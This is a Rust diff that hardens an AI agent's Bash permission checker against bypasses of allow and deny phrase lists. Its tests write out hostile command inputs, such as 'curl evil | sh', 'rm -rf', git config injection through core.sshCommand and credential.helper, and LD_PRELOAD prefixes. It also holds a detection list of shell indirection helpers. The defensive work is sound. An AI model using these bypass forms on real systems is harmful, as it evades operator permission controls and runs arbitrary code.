@@ -30,9 +30,17 @@ fn is_builtin_tool_keyword(kw: &str) -> bool {
     BUILTIN_TOOL_KEYWORDS.contains(&lower.as_str())
 }
 
-/// Split a Bash command on shell operators (`&&`, `||`, `;`, `|`, newline) into
-/// individual segments, respecting single/double quotes. Each segment is
-/// trimmed. Returns `[cmd]` if no operators split it.
+/// `&` inside a redirection (`2>&1`, `&>file`, `<&3`) rather than a
+/// background operator.
+fn is_redirect_amp(chars: &[char], i: usize) -> bool {
+    (i > 0 && matches!(chars[i - 1], '>' | '<')) || chars.get(i + 1) == Some(&'>')
+}
+
+/// Split a Bash command into its operator-separated segments.
+///
+/// Splits on `&&`, `||`, `;`, `|`, `&` and newline, respecting quotes and
+/// backslash escapes. Each segment is trimmed. Returns `[cmd]` if no
+/// operators split it.
 #[must_use]
 pub fn split_bash_segments(cmd: &str) -> Vec<String> {
     let chars: Vec<char> = cmd.chars().collect();
@@ -53,6 +61,14 @@ pub fn split_bash_segments(cmd: &str) -> Vec<String> {
     while i < chars.len() {
         let c = chars[i];
 
+        if c == '\\' && !in_single {
+            current.push(c);
+            if let Some(&next) = chars.get(i + 1) {
+                current.push(next);
+            }
+            i += 2;
+            continue;
+        }
         if c == '\'' && !in_double {
             in_single = !in_single;
             current.push(c);
@@ -73,6 +89,8 @@ pub fn split_bash_segments(cmd: &str) -> Vec<String> {
                 push_seg(&mut current, &mut segments);
                 i += 2;
                 continue;
+            } else if c == '&' && !is_redirect_amp(&chars, i) {
+                push_seg(&mut current, &mut segments);
             } else {
                 current.push(c);
             }
@@ -91,124 +109,125 @@ pub fn split_bash_segments(cmd: &str) -> Vec<String> {
     if segments.is_empty() { vec![cmd.to_string()] } else { segments }
 }
 
+/// Git global options that take a separate argument.
+const GIT_ARG_FLAGS: &[&str] =
+    &["-C", "-c", "--git-dir", "--work-tree", "--namespace", "--config-env", "--super-prefix"];
+
 /// Normalize a Bash segment so phrase keywords match real-world invocations.
 ///
-/// Strips git's global option flags that sit between `git` and the subcommand
-/// (e.g. `git -C /workspace/repo fetch` → `git fetch`,
-/// `git -c k=v --no-pager log` → `git log`), so allowlist phrases like
-/// `git fetch` match regardless of how the working directory or config is
-/// passed. Mirrors the Python regex:
-/// `^(git)(\s+(?:-C\s+\S+|-c\s+\S+|--no-pager|--git-dir[= ]\S+|--work-tree[= ]\S+))+\s+`
+/// Every global option between `git` and its subcommand is dropped
+/// (`git -C /repo fetch` → `git fetch`, `git --bare -p push` → `git push`), and
+/// a path-qualified `/usr/bin/git` becomes `git`, so both allow and disallow
+/// phrases see the bare subcommand.
 #[must_use]
 pub fn normalize_bash_segment(seg: &str) -> String {
-    let seg = seg.trim();
-    let rest = match seg.strip_prefix("git") {
-        Some(r) if r.starts_with(char::is_whitespace) => r,
-        _ => return seg.to_string(),
-    };
-
-    // Consume one-or-more global-flag groups. Track whether we consumed at least
-    // one, and where the subcommand begins.
-    let mut remainder = rest;
-    let mut consumed_any = false;
-
-    loop {
-        let trimmed = remainder.trim_start();
-        let ws_len = remainder.len() - trimmed.len();
-        if ws_len == 0 {
-            // No whitespace before next token: cannot be a flag group boundary.
-            break;
-        }
-        if let Some(after) = consume_git_flag(trimmed) {
-            consumed_any = true;
-            remainder = after;
+    let toks: Vec<&str> = seg.split_whitespace().collect();
+    let is_git = |t: &str| t == "git" || t.ends_with("/git");
+    if !toks.iter().any(|t| is_git(t)) {
+        return seg.trim().to_string();
+    }
+    let mut out = Vec::with_capacity(toks.len());
+    let mut i = 0;
+    while i < toks.len() {
+        if is_git(toks[i]) {
+            out.push("git");
+            let mut j = i + 1;
+            while j < toks.len() && toks[j].starts_with('-') {
+                j += if GIT_ARG_FLAGS.contains(&toks[j]) { 2 } else { 1 };
+            }
+            if j < toks.len() {
+                i = j;
+                continue;
+            }
         } else {
-            // The next token is the subcommand. `remainder` still has its
-            // leading whitespace (the `\s+` before the subcommand in the regex).
-            break;
+            out.push(toks[i]);
         }
+        i += 1;
     }
-
-    if !consumed_any {
-        return seg.to_string();
-    }
-
-    // The regex requires trailing `\s+` then leaves the subcommand. If what
-    // remains after the flags has no whitespace separator + token, the pattern
-    // would not have matched; fall back to the original.
-    let subcommand = remainder.trim_start();
-    if remainder.len() == subcommand.len() || subcommand.is_empty() {
-        return seg.to_string();
-    }
-    format!("git {subcommand}")
+    out.join(" ")
 }
 
-/// If `s` begins with a single git global-flag token, return the slice after it.
-/// Handles: `-C <arg>`, `-c <arg>`, `--no-pager`, `--git-dir[= ]<arg>`,
-/// `--work-tree[= ]<arg>`.
-fn consume_git_flag(s: &str) -> Option<&str> {
-    let next_token_arg = |after_flag: &str| -> Option<usize> {
-        // after_flag begins right after the flag name; expect whitespace then a
-        // non-whitespace argument (\S+). Return offset (within s) past the arg.
-        let trimmed = after_flag.trim_start();
-        let ws = after_flag.len() - trimmed.len();
-        if ws == 0 {
-            return None;
-        }
-        let arg_end = trimmed.find(char::is_whitespace).unwrap_or(trimmed.len());
-        if arg_end == 0 {
-            return None;
-        }
-        Some((s.len() - after_flag.len()) + ws + arg_end)
-    };
+/// Environment variables a command prefix may set without a `Bash` grant;
+/// any other `NAME=value` (`GIT_SSH_COMMAND`, `PATH`, `LD_PRELOAD`, …) can
+/// redirect what the command executes.
+const SAFE_ENV_NAMES: &[&str] =
+    &["GIT_PAGER", "GIT_TERMINAL_PROMPT", "PAGER", "LANG", "TZ", "NO_COLOR", "TERM", "CI"];
+const SAFE_ENV_NAME_PREFIXES: &[&str] = &["GIT_TRACE", "LC_"];
 
-    if let Some(after) = s.strip_prefix("--no-pager") {
-        // Must be a full token (followed by whitespace or end).
-        if after.is_empty() || after.starts_with(char::is_whitespace) {
-            return Some(after);
+fn is_safe_env_assignment(tok: &str) -> bool {
+    let name = tok.split_once('=').map_or(tok, |(n, _)| n);
+    SAFE_ENV_NAMES.contains(&name) || SAFE_ENV_NAME_PREFIXES.iter().any(|p| name.starts_with(p))
+}
+
+/// A git global option that injects config or swaps the helper binaries,
+/// which can run arbitrary code or alias a subcommand to another one.
+fn is_code_changing_git_flag(tok: &str) -> bool {
+    tok.starts_with("-c")
+        || tok == "--config-env"
+        || tok.starts_with("--config-env=")
+        || tok.starts_with("--exec-path=")
+}
+
+fn git_globals_change_code(after_git: &[String]) -> bool {
+    let mut j = 0;
+    while let Some(tok) = after_git.get(j).filter(|t| t.starts_with('-')) {
+        if is_code_changing_git_flag(tok) {
+            return true;
         }
-        return None;
+        j += if GIT_ARG_FLAGS.contains(&tok.as_str()) { 2 } else { 1 };
     }
-    for prefix in ["--git-dir", "--work-tree"] {
-        if let Some(after) = s.strip_prefix(prefix) {
-            // `=<arg>` or ` <arg>`.
-            if let Some(eq_rest) = after.strip_prefix('=') {
-                let end = eq_rest.find(char::is_whitespace).unwrap_or(eq_rest.len());
-                if end == 0 {
-                    return None;
-                }
-                return Some(&eq_rest[end..]);
-            }
-            if let Some(end) = next_token_arg(after) {
-                return Some(&s[end..]);
-            }
-            return None;
-        }
-    }
-    for prefix in ["-C", "-c"] {
-        if let Some(after) = s.strip_prefix(prefix) {
-            // `-C` / `-c` take a following whitespace-separated argument.
-            if let Some(end) = next_token_arg(after) {
-                return Some(&s[end..]);
-            }
-            return None;
-        }
-    }
-    None
+    false
+}
+
+fn is_shell(tok: &str) -> bool {
+    matches!(tok.rsplit('/').next().unwrap_or(tok), "bash" | "sh" | "zsh" | "dash" | "ksh")
+}
+
+fn is_interpreter(tok: &str) -> bool {
+    let base = tok.rsplit('/').next().unwrap_or(tok);
+    base.starts_with("python") || matches!(base, "perl" | "ruby" | "node")
 }
 
 /// True when a segment hides an arbitrary command from phrase matching —
-/// command substitution (`$(…)`, backticks), heredocs, or an indirection helper
-/// (`bash -c`, `sh -c`, `xargs`) — so only an explicit `Bash`/`*` grant, not a
+/// command or process substitution, heredocs, an indirection helper (`bash
+/// -c`, `eval`, `xargs`, `python -c`), config-injecting git options, or a
+/// risky `NAME=value` prefix — so only an explicit `Bash`/`*` grant, not a
 /// phrase, may clear it.
 fn segment_needs_bash_grant(seg: &str) -> bool {
-    if seg.contains("$(") || seg.contains('`') || seg.contains("<<") {
+    if ["$(", "`", "<<", "<(", ">("].iter().any(|m| seg.contains(*m)) {
         return true;
     }
-    let hay = format!("Bash {seg}");
-    phrase_matches(&hay, "bash -c")
-        || phrase_matches(&hay, "sh -c")
-        || phrase_matches(&hay, "xargs")
+    let toks =
+        shlex::split(seg).unwrap_or_else(|| seg.split_whitespace().map(str::to_string).collect());
+    let mut leading = true;
+    for (i, tok) in toks.iter().enumerate() {
+        if leading {
+            if tok == "env" {
+                continue;
+            }
+            if is_env_assignment(tok) {
+                if !is_safe_env_assignment(tok) {
+                    return true;
+                }
+                continue;
+            }
+            leading = false;
+        }
+        let flags = || toks[i + 1..].iter().take_while(|t| t.starts_with('-'));
+        let has_short =
+            |letters: &[char]| flags().any(|f| !f.starts_with("--") && f.contains(letters));
+        if tok == "eval"
+            || tok == "xargs"
+            || (is_shell(tok) && has_short(&['c']))
+            || (is_interpreter(tok) && has_short(&['c', 'e']))
+        {
+            return true;
+        }
+        if (tok == "git" || tok.ends_with("/git")) && git_globals_change_code(&toks[i + 1..]) {
+            return true;
+        }
+    }
+    false
 }
 
 /// Whether the allowed list confers full `Bash` trust: the bare `Bash` tool
@@ -233,14 +252,46 @@ fn phrase_matches(match_str: &str, keyword: &str) -> bool {
     hay.windows(needle.len()).any(|w| w == needle.as_slice())
 }
 
+fn is_env_assignment(tok: &str) -> bool {
+    tok.split_once('=').is_some_and(|(name, _)| {
+        name.starts_with(|c: char| c.is_ascii_alphabetic() || c == '_')
+            && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
+    })
+}
+
+/// Match an allow phrase only where a command begins: at the start of the
+/// match string (`Bash` itself) or at the segment's argv[0], after leading
+/// `VAR=value` assignments and an `env` wrapper. `git fetch` thus allows
+/// `GIT_TRACE=1 git fetch` but not `python3 -c x git fetch`.
+fn phrase_matches_anchored(match_str: &str, keyword: &str) -> bool {
+    let hay_lower = match_str.to_ascii_lowercase();
+    let kw_lower = keyword.to_ascii_lowercase();
+    let (Some(hay), Some(needle)) = (shlex::split(&hay_lower), shlex::split(&kw_lower)) else {
+        return false;
+    };
+    if needle.is_empty() {
+        return false;
+    }
+    if hay.starts_with(&needle) {
+        return true;
+    }
+    let mut start = 1;
+    while start < hay.len() && (hay[start] == "env" || is_env_assignment(&hay[start])) {
+        start += 1;
+    }
+    hay.get(start..).is_some_and(|rest| rest.starts_with(&needle))
+}
+
 /// Check a single match string against allowed/disallowed keyword lists.
 /// Returns `(is_allowed, reason)`. When `token_match` is set, keywords are
 /// matched as argv token phrases; otherwise plain substring (MCP payloads).
+/// With `anchor_allowed`, allow phrases must sit at the command's start.
 fn check_single(
     match_str: &str,
     allowed: &[String],
     disallowed: &[String],
     token_match: bool,
+    anchor_allowed: bool,
 ) -> (bool, String) {
     let contains = |kw: &str| {
         if token_match {
@@ -249,13 +300,16 @@ fn check_single(
             match_str.to_ascii_lowercase().contains(&kw.to_ascii_lowercase())
         }
     };
+    let allows = |kw: &str| {
+        if anchor_allowed { phrase_matches_anchored(match_str, kw) } else { contains(kw) }
+    };
     let has_wildcard = |v: &[String]| v.iter().any(|s| s == "*");
 
     if !disallowed.is_empty() {
         if has_wildcard(disallowed) {
             if !allowed.is_empty() && !has_wildcard(allowed) {
                 for kw in allowed {
-                    if contains(kw) {
+                    if allows(kw) {
                         return (true, String::new());
                     }
                 }
@@ -285,7 +339,7 @@ fn check_single(
             return (true, String::new());
         }
         for kw in allowed {
-            if contains(kw) {
+            if allows(kw) {
                 return (true, String::new());
             }
         }
@@ -338,7 +392,7 @@ pub fn check_rules(
                 );
             }
             let match_str = format!("Bash {}", normalize_bash_segment(&seg));
-            let (ok, reason) = check_single(&match_str, &allowed, &disallowed, true);
+            let (ok, reason) = check_single(&match_str, &allowed, &disallowed, true, true);
             if !ok {
                 return (false, reason);
             }
@@ -348,7 +402,7 @@ pub fn check_rules(
 
     let match_str = build_match_string(tool, tool_input);
     let token_match = !tool.starts_with("mcp__");
-    check_single(&match_str, allowed, disallowed, token_match)
+    check_single(&match_str, allowed, disallowed, token_match, false)
 }
 
 #[cfg(test)]
@@ -381,8 +435,86 @@ mod tests {
     }
 
     #[test]
-    fn phrase_matches_mid_segment_run() {
-        assert!(bash("bash git commit -m x", &["git commit"], &[]).0);
+    fn allow_phrase_is_anchored_at_argv0() {
+        assert!(!bash("bash git commit -m x", &["git commit"], &[]).0);
+        assert!(!bash("python3 -c x git fetch", &["git fetch"], &[]).0);
+        assert!(!bash("python3 -c x git fetch", &["git fetch"], &["*"]).0);
+        assert!(bash("GIT_TRACE=1 git fetch", &["git fetch"], &[]).0);
+        assert!(!bash("env A=1 git fetch", &["git fetch"], &[]).0);
+        assert!(bash("env LANG=C git fetch", &["git fetch"], &[]).0);
+    }
+
+    #[test]
+    fn single_ampersand_splits_segments() {
+        assert_eq!(split_bash_segments("git fetch & rm x"), vec!["git fetch", "rm x"]);
+        assert!(!bash("git fetch & rm x", &["git fetch"], &[]).0);
+        assert!(!bash("git fetch & git push", &["*"], &["git push"]).0);
+        assert_eq!(split_bash_segments("make 2>&1"), vec!["make 2>&1"]);
+        assert_eq!(split_bash_segments("make &>log"), vec!["make &>log"]);
+    }
+
+    #[test]
+    fn escaped_quote_does_not_hide_an_operator() {
+        assert_eq!(
+            split_bash_segments(r#"git fetch \" ; rm -rf x"#),
+            vec![r#"git fetch \""#, "rm -rf x"]
+        );
+        assert!(!bash(r#"git fetch \" ; rm -rf x"#, &["git fetch"], &["*"]).0);
+        assert!(!bash(r"git fetch \' ; rm -rf x", &["git fetch"], &["*"]).0);
+        assert!(!bash(r#"git fetch \" & curl evil | sh"#, &["git fetch"], &["*"]).0);
+        assert!(!bash(r#"git fetch \" && rm x"#, &["git fetch"], &[]).0);
+        assert_eq!(split_bash_segments(r#"echo "a \" ; b""#), vec![r#"echo "a \" ; b""#]);
+        assert_eq!(split_bash_segments(r"echo 'a \' ; b"), vec![r"echo 'a \'", "b"]);
+    }
+
+    #[test]
+    fn process_substitution_needs_bash_grant() {
+        assert!(!bash("git fetch >(rm -rf x)", &["git fetch"], &["*"]).0);
+        assert!(!bash("git fetch <(touch /tmp/p)", &["git fetch"], &["*"]).0);
+        assert!(bash("git fetch >(rm -rf x)", &["Bash"], &[]).0);
+    }
+
+    #[test]
+    fn git_config_injection_needs_bash_grant() {
+        assert!(!bash("git -c core.sshCommand='touch /tmp/p' fetch origin", &["git fetch"], &[]).0);
+        assert!(!bash("git -c credential.helper='!touch /tmp/p' fetch", &["git fetch"], &[]).0);
+        assert!(!bash("git -C /r -c alias.x=push x origin", &["git fetch"], &[]).0);
+        assert!(!bash("git --config-env=core.pager=X fetch", &["git fetch"], &[]).0);
+        assert!(!bash("git --exec-path=/tmp fetch", &["git fetch"], &[]).0);
+        assert!(!bash("git -c alias.x=push x origin main", &[], &["git push"]).0);
+    }
+
+    #[test]
+    fn risky_env_prefix_needs_bash_grant() {
+        assert!(!bash("GIT_SSH_COMMAND='touch /tmp/p' git fetch origin", &["git fetch"], &[]).0);
+        assert!(!bash("PATH=/tmp git fetch", &["git fetch"], &[]).0);
+        assert!(!bash("LD_PRELOAD=/tmp/x.so git fetch", &["git fetch"], &[]).0);
+        assert!(!bash("env LD_PRELOAD=/tmp/x.so git fetch", &["git fetch"], &[]).0);
+        assert!(bash("GIT_TRACE=1 LC_ALL=C git fetch", &["git fetch"], &[]).0);
+    }
+
+    #[test]
+    fn more_indirection_helpers_need_bash_grant() {
+        assert!(!bash("bash -lc 'git push'", &[], &["git push"]).0);
+        assert!(!bash("bash --norc -c 'git push'", &[], &["git push"]).0);
+        assert!(!bash("eval 'git push'", &[], &["git push"]).0);
+        assert!(!bash("zsh -c 'git push'", &[], &["git push"]).0);
+        assert!(!bash("python3 -c 'import os'", &["python3"], &[]).0);
+        assert!(!bash("perl -e 'system 1'", &["perl"], &[]).0);
+        assert!(bash("python3 script.py", &["python3"], &[]).0);
+    }
+
+    #[test]
+    fn every_git_global_flag_is_stripped() {
+        assert_eq!(normalize_bash_segment("git --bare push"), "git push");
+        assert_eq!(normalize_bash_segment("git -p push origin"), "git push origin");
+        assert_eq!(normalize_bash_segment("git --namespace ns -P push"), "git push");
+        assert_eq!(normalize_bash_segment("/usr/bin/git push"), "git push");
+        assert_eq!(normalize_bash_segment("git --version"), "git --version");
+        assert!(!bash("git --bare push", &[], &["git push"]).0);
+        assert!(!bash("git -p push", &[], &["git push"]).0);
+        assert!(!bash("sudo git --paginate push", &["*"], &["git push"]).0);
+        assert!(bash("git --no-pager -C /r fetch", &["git fetch"], &[]).0);
     }
 
     #[test]
